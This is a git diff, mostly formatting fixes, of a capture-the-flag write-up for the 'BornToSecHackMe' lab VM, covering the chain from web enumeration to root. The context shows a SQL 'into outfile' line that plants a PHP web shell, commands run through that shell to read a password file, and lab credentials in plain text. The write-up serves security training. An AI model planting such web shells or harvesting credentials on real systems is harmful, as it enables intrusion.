@@ -1,5 +1,14 @@
 # The Normal Way to Gain Root Access
 
+<!--toc:start-->
+- [The Normal Way to Gain Root Access](#the-normal-way-to-gain-root-access)
+  - [PhpMyAdmin exploit - SYSTEM IT](#phpmyadmin-exploit---system-it)
+  - [lmezard ftp - THE WAY TO HAVE FUN](#lmezard-ftp---the-way-to-have-fun)
+  - [Laurie user - THE BOMB](#laurie-user---the-bomb)
+  - [Thor user - THE MOVING TURTLE](#thor-user---the-moving-turtle)
+  - [Zaz user - Privilege escalation](#zaz-user---privilege-escalation)
+<!--toc:end-->
+
 We have analyze http server with ssl certificate using gobuster.
 
 `-k` option is used to skip SSL certificate verification. Without this option we can´t launch command.
@@ -16,7 +25,7 @@ $gobuster dir -u $IP:443 -w /usr/share/wordlists/dirb/big.txt -k
 /webmail              (Status: 301) [Size: 320] [--> https://192.168.56.101/webmail/]
 ```
 
-Resume: We have a lot of interresting pages: 
+Resume: We have a lot of interresting pages:
 
 | **SERVICE NAME** | **PAGE NAME** | **VERSION**    |
 |------------------|---------------|----------------|
@@ -25,8 +34,7 @@ Resume: We have a lot of interresting pages:
 | SquirrelMail     | webmail       | 1.4.22         |
 | MySQL            | NONE          | 2.3 ?          |
 
-
-On the page `https://192.168.56.101/forum/index.php?id=6` we have a lot of connection logs from `lmezard`. We can see this: 
+On the page `https://192.168.56.101/forum/index.php?id=6` we have a lot of connection logs from `lmezard`. We can see this:
 
 ```bash
 Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
@@ -46,14 +54,14 @@ pw: !q\]Ej?*5K5cy*AJ
 
 We can inspect mail. There are 2 mails. `DB Access` and `Very interesting !!!!`.  
 With the first mail we have credentials to DB access. We can try it.  
-It's working ! 
+It's working !
 
-```bash 
+```bash
 id: root
 pw: Fg-'kKXBj87E:aJ$
 ```
 
-## PhpMyAdmin exploit: SYSTEM IT!
+## PhpMyAdmin exploit - SYSTEM IT
 
 We can inspect it.  
 We have a `forum_db` database with various table like `mlf2_userdata`.  
@@ -65,7 +73,8 @@ We can use this command in our phpmyadmin:
 ```sql
 select '<?php system($_GET["cmd"]); ?>' into outfile "/var/www/forum/templates_c/cmd.php";
 ```
-We have written php code in the file `/var/www/forum/templates_c/cmd.php` to execute any strings in the `cmd` parameter. 
+
+We have written php code in the file `/var/www/forum/templates_c/cmd.php` to execute any strings in the `cmd` parameter.
 When visiting the url `/forum/templates_c/cmd.php?cmd=ls` the code will be executed.  
 
 After executing many commands, we have found a file `password` in `/home/LOOKATME/`.  
@@ -74,7 +83,9 @@ After executing many commands, we have found a file `password` in `/home/LOOKATM
 cmd=cat /home/LOOKATME/password
 lmezard:G!@M6f4Eatau{sF" 
 ```
-## lmezard ftp: THE WAY TO HAVE FUN!
+
+## lmezard ftp - THE WAY TO HAVE FUN
+
 This `credentials` can be used on ftp server. With this access with have obtained 2 files:
 
 ```bash
@@ -90,9 +101,10 @@ ftp> ls
 -rwxr-x---    1 1001     1001           96 Oct 15  2015 README
 -rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
 ```
+
 `README` give instructions: complete the challenge to obtain password of ssh user `laurie`.
 `fun` is a puzzle. Using `file` command on fun. We have seen that it was a `tar archive`. So we have extract this file to obtain a directory in wich have lot of files.  
-In order to understand wich append in these files we have cat all in a single output:   
+In order to understand wich append in these files we have cat all in a single output:
 
 ```bash
 $file fun
@@ -100,8 +112,10 @@ fun: POSIX tar archive (GNU)
 $tar -xf fun
 $cat * > output.txt
 ```
+
 We have read this file. It seems to be a puzzle of program. Each file has a comment with file number.  
-We have write a [script](merge_files.rs) to sort all files by his file_number. After that, we have a C program. We can compile it with gcc to obtain a phrase `Iheartpwnage`.
+We have write a [script](merge_files.rs) to sort all files by his file_number.
+After that, we have a C program. We can compile it with gcc to obtain a phrase `Iheartpwnage`.
 
 ```bash
 $ rustc merge_files.rs && ./merge_files
@@ -127,9 +141,10 @@ ssh laurie@192.168.56.101
 laurie@192.168.56.101's password: 
 laurie@BornToSecHackMe:~$
 ```
+
 Its working !
 
-## Laurie user: THE BOMB!
+## Laurie user - THE BOMB
 
 Now that we are connected on laurie we can inspect is `home` directory:  
 
@@ -170,12 +185,12 @@ bomb                                          100%   26KB  26.3KB/s   00:00
 
 We have reverse all function and obtained values:  
 
-* Public speaking is very easy. (String is given.)
-* 1 2 6 24 120 720 (Each previous value give us the current: val[n - 1] * i. First value is give.)
-* 1 b 214 OU 2 b 755 OU 7 b 524 (Simple switch case.)
-* 9 (We have brute force this function to obtain result. ([script](puzzle4.c)))
-* opekma (This issue is working but another response are possible.)
-* 4 2 6 3 1 5 (It was a chained list in which each value must be sorted in descending order.)
+- Public speaking is very easy. (String is given.)
+- 1 2 6 24 120 720 (Each previous value give us the current: val[n - 1] * i. First value is give.)
+- 1 b 214 OU 2 b 755 OU 7 b 524 (Simple switch case.)
+- 9 (We have brute force this function to obtain result. ([script](puzzle4.c)))
+- opekma (This issue is working but another response are possible.)
+- 4 2 6 3 1 5 (It was a chained list in which each value must be sorted in descending order.)
 
 ```bash
 laurie@BornToSecHackMe:~$ ./bomb test.txt
@@ -194,9 +209,10 @@ Good work!  On to the next...
 4 2 6 3 1 5
 Congratulations! You've defused the bomb!
 ```
+
 Because have a lot of possibilities of password for the user thor. We have write a [script](thor_password.js) to create a list of passwords and try them all.
 
-## Thor user: THE MOVING TURTLE!
+## Thor user - THE MOVING TURTLE
 
 In the thor home directory we can find a readme and a file named turtle.
 
@@ -242,7 +258,7 @@ zaz@BornToSecHackMe:~$ id
 uid=1005(zaz) gid=1005(zaz) groups=1005(zaz)
 ```
 
-## ZAZ Privilege escalation
+## Zaz user - Privilege escalation
 
 In the `zaz` home directory we can find a file named `exploit_me`.
 
@@ -278,7 +294,7 @@ Breakpoint 1, 0x0804842c in main ()
 Stack level 0, frame at 0xbffff720:
  eip = 0x804842c in main; saved eip 0xb7e454d3
  Arglist at 0xbffff718, args: 
- Locals at 0xbffff718, Previous frame\'s sp is 0xbffff720
+ Locals at 0xbffff718, Previous frame s sp is 0xbffff720
  Saved registers:
   ebp at 0xbffff718, eip at 0xbffff71c
 ```
